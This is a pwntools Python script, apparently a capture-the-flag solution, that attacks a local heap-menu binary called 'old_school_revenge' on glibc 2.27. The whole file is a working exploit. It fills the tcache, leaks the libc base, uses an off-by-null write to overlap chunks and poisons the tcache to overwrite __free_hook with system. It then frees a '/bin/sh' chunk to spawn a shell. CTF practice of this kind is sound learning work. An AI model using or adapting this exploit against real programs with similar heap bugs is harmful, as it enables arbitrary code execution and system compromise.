from pwn import *

def add(idx, size):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'1')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx))
    p.recvuntil('Size')
    p.sendline(str(size))

def edit(idx, content):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx))
    p.recvuntil(b'Content: ')
    p.sendline(content)

def show(idx):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'3')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx))

def delete(idx):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'4')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx))

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./old_school_revenge')
elf = ELF('./old_school_revenge')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

for i in range(7):
    add(i, 0xf8); #0 ~ 6

add(7, 0xf8)

'''
prepared for chunk overlap
'''
add(8, 0xf8)
add(9, 0x68)
add(10, 0xf8)

add(11, 0x10)

'''
leak libc
'''
for i in range(7):
    delete(i)
delete(7)
add(30, 0x90)
add(31, 0x50)
show(30)
p.recvuntil(b'Content: ')
libc_base = u64(p.recvline()[:-1] + b'\x00' * 0x2) - 0x3ebd90
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
print("libc base:", hex(libc_base))

'''
use off-by-null for chunk overlap
'''
delete(8)
edit(9, b'\x00' * 0x60 + p64(0x170))
delete(10) # merge

'''
overwrite free_hook and get shell
'''
delete(9)
for i in range(7):
    add(i, 0xf8); #0 ~ 6
add(20, 0x80)
add(21, 0xf8)
edit(21, b'\x00' * 0x68 + p64(0x71) + p64(free_hook))
add(22, 0x68)
add(23, 0x68) # free_hook
edit(23, p64(system))
edit(22, b'/bin/sh\x00')
delete(22)

p.interactive()
